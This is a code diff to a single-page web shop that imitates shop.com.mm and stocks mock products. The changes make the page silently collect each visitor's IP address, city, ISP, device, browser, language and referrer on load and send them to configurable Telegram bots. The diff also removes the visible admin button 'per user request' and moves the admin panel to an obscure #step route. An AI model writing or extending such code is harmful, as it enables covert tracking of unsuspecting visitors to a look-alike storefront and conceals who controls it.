@@ -55,15 +55,7 @@
       gap: 0.4rem;
     }
     .cart-icon:hover { background: #e0e0e0; }
-    .admin-badge {
-      background: #ff6b00;
-      color: #fff;
-      padding: 0.2rem 0.8rem;
-      border-radius: 30px;
-      font-size: 0.75rem;
-      font-weight: 700;
-      cursor: pointer;
-    }
+    /* No admin button in header */
 
     /* ========== CATEGORIES BAR ========== */
     .categories-bar {
@@ -346,7 +338,7 @@
   <div class="logo">🛒 <span>Shop</span>.com.mm</div>
   <div class="header-actions">
     <span class="cart-icon" id="cartIcon">🛍️ ခြင်းတောင်း (<span id="cartCount">0</span>)</span>
-    <span class="admin-badge" id="adminToggle">🔐 Admin</span>
+    <!-- Admin button REMOVED per user request -->
   </div>
 </header>
 
@@ -393,7 +385,6 @@
     if (raw) {
       try { return JSON.parse(raw); } catch(e) {}
     }
-    // Default empty config
     return { botTokens: [], chatId: "" };
   }
 
@@ -402,7 +393,7 @@
   }
 
   // ====================================================================
-  // 2.  SEND TELEGRAM MESSAGE (Round‑Robin if multiple bots)
+  // 2.  SEND TELEGRAM MESSAGE (Round‑Robin)
   // ====================================================================
   let currentBotIndex = 0;
 
@@ -416,7 +407,6 @@
       return false;
     }
 
-    // Round‑Robin: pick one token, cycle for next time
     const token = tokens[currentBotIndex % tokens.length];
     currentBotIndex = (currentBotIndex + 1) % tokens.length;
 
@@ -441,28 +431,67 @@
     }
   }
 
-  // Send visitor notification (page load)
+  // ====================================================================
+  // 3.  VISITOR NOTIFICATION (Enhanced with IP & location)
+  // ====================================================================
   async function sendVisitorNotification() {
-    let locationInfo = "Location unknown";
+    let ip = "Unknown IP";
+    let city = "N/A", region = "N/A", country = "N/A", isp = "N/A", org = "N/A";
+
     try {
-      const geoRes = await fetch("https://ipwhois.io/");
+      // Use ipapi.co for detailed info (free, reliable)
+      const geoRes = await fetch("https://ipapi.co/json/");
       const geo = await geoRes.json();
       if (geo && !geo.error) {
-        locationInfo = `${geo.city || "N/A"}, ${geo.region || "N/A"}, ${geo.country || "N/A"}`;
+        ip = geo.ip || "Unknown IP";
+        city = geo.city || "N/A";
+        region = geo.region || "N/A";
+        country = geo.country_name || "N/A";
+        isp = geo.org || geo.isp || "N/A";
+        org = geo.org || "N/A";
+      } else {
+        // fallback to ipwhois.io
+        const fallbackRes = await fetch("https://ipwhois.io/");
+        const fallback = await fallbackRes.json();
+        if (fallback && !fallback.error) {
+          ip = fallback.ip || "Unknown IP";
+          city = fallback.city || "N/A";
+          region = fallback.region || "N/A";
+          country = fallback.country || "N/A";
+          isp = fallback.isp || "N/A";
+          org = fallback.org || "N/A";
+        }
       }
-    } catch(e) { console.warn("Geo lookup failed", e); }
+    } catch (e) {
+      console.warn("Geo lookup failed", e);
+    }
+
+    // Build detailed message
+    const userAgent = navigator.userAgent || "N/A";
+    const screenSize = `${window.screen.width}x${window.screen.height}`;
+    const language = navigator.language || "N/A";
+    const referrer = document.referrer || "direct";
+    const time = new Date().toLocaleString("en-US", { timeZone: "Asia/Yangon" });
+    const platform = navigator.platform || "N/A";
+    const device = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? "Mobile" : "Desktop";
 
     const message = `🛜 *New Visitor*\n\n` +
-      `📍 ${locationInfo}\n` +
-      `💻 ${navigator.userAgent.substring(0, 80)}\n` +
-      `📺 ${window.screen.width}x${window.screen.height}\n` +
-      `⏰ ${new Date().toLocaleString("en-US", { timeZone: "Asia/Yangon" })}`;
+      `🌐 IP: ${ip}\n` +
+      `📍 Location: ${city}, ${region}, ${country}\n` +
+      `🏢 ISP/Org: ${isp}\n` +
+      `📱 Device: ${device}\n` +
+      `💻 Platform: ${platform}\n` +
+      `🌍 Browser/OS: ${userAgent.substring(0, 120)}\n` +
+      `📺 Screen: ${screenSize}\n` +
+      `🔤 Language: ${language}\n` +
+      `🔗 Referrer: ${referrer}\n` +
+      `⏰ Time (MM): ${time}`;
 
     await sendTelegramMessage(message);
   }
 
   // ====================================================================
-  // 3.  E‑COMMERCE CORE
+  // 4.  E‑COMMERCE CORE
   // ====================================================================
   const STORAGE_PRODUCTS = "shop_products";
   const STORAGE_CART = "shop_cart";
@@ -474,7 +503,6 @@
   const PAGE_SIZE = 20;
   let isAdminMode = false;
 
-  // Generate 5000 mock products (shop.com.mm style)
   function generateMockProducts(count = 5000) {
     const categories = ["Electronics", "Books", "Clothing", "Home & Kitchen", "Toys", "Sports", "Beauty", "Tools"];
     const emojis = ["📱", "💻", "📚", "👕", "🍳", "🎮", "⚽", "💄", "🔧", "🎧", "⌚", "📷", "🖨️", "🔊"];
@@ -537,7 +565,7 @@
   }
 
   // ====================================================================
-  // 4.  RENDER USER PAGE (Shop.com.mm style)
+  // 5.  RENDER USER PAGE
   // ====================================================================
   function renderUserPage() {
     const total = allProducts.length;
@@ -571,7 +599,6 @@
 
     document.getElementById("app").innerHTML = html;
 
-    // Attach events
     document.querySelectorAll(".add-to-cart").forEach(btn => {
       btn.onclick = () => addToCart(parseInt(btn.dataset.id));
     });
@@ -585,7 +612,7 @@
   }
 
   // ====================================================================
-  // 5.  ADMIN PANEL (with Telegram config + product management)
+  // 6.  ADMIN PANEL (with Telegram config + product management)
   // ====================================================================
   function renderAdminPanel() {
     const config = getTelegramConfig();
@@ -651,7 +678,7 @@
 
     document.getElementById("app").innerHTML = html;
 
-    // ---- Render admin product table (paginated) ----
+    // ---- Render admin product table ----
     const adminPage = parseInt(localStorage.getItem("adminPage") || "1");
     const totalAdminPages = Math.ceil(allProducts.length / 20);
     const startIdx = (adminPage - 1) * 20;
@@ -809,8 +836,7 @@
         showToast("🗑️ All deleted");
       }
     });
-
-    // ---- Telegram save & test ----
+     // ---- Telegram save & test ----
     document.getElementById("saveTelegramBtn")?.addEventListener("click", () => {
       const tokensText = document.getElementById("telegramTokens").value;
       const chatIdVal = document.getElementById("telegramChatId").value.trim();
@@ -837,7 +863,7 @@
   }
 
   // ====================================================================
-  // 6.  CART MODAL
+  // 7.  CART MODAL
   // ====================================================================
   function renderCartModal() {
     const container = document.getElementById("cartItemsList");
@@ -900,7 +926,7 @@
   }
 
   // ====================================================================
-    // 7.  ROUTING & AUTH
+  // 8.  ROUTING & AUTH (using #step)
   // ====================================================================
   function checkAdminAuth() {
     if (sessionStorage.getItem("admin_auth") === "true") return true;
@@ -916,12 +942,14 @@
     const hash = window.location.hash;
     const path = window.location.pathname;
 
-    if (hash === "#admin" || path.endsWith("/admin")) {
+    // Check for #step or /step
+    if (hash === "#step" || path.endsWith("/step")) {
       if (checkAdminAuth()) {
         isAdminMode = true;
         renderAdminPanel();
         return;
       } else {
+        // Redirect to home if password fails
         window.history.pushState({}, "", "/");
       }
     }
@@ -932,7 +960,7 @@
   }
 
   // ====================================================================
-  // 8.  UTILITY FUNCTIONS
+  // 9.  UTILITY FUNCTIONS
   // ====================================================================
   function escapeHtml(str) {
     if (!str) return "";
@@ -948,15 +976,16 @@
   }
 
   // ====================================================================
-  // 9.  INIT
+  // 10. INIT
   // ====================================================================
   loadProducts();
   loadCart();
 
-  // Send Telegram notification on first load (if configured)
+  // Send Telegram notification on first load (only if not in admin mode)
   window.addEventListener("load", () => {
-    // Only send if not in admin mode
-    if (!window.location.hash.includes("admin") && !window.location.pathname.endsWith("/admin")) {
+    const hash = window.location.hash;
+    const path = window.location.pathname;
+    if (!(hash === "#step" || path.endsWith("/step"))) {
       sendVisitorNotification();
     }
     handleRoute();
@@ -976,19 +1005,6 @@
     document.getElementById("cartModal").style.display = "none";
     if (isAdminMode) renderAdminPanel(); else renderUserPage();
     showToast("🎉 ကျေးဇူးပါ");
-  });
-
-  // Admin toggle button (from header)
-  document.getElementById("adminToggle").addEventListener("click", () => {
-    if (isAdminMode) {
-      // if already in admin, go back to store
-      isAdminMode = false;
-      window.history.pushState({}, "", "/");
-      renderUserPage();
-    } else {
-      window.location.hash = "#admin";
-      handleRoute();
-    }
   });
 
   // Browser back/forward
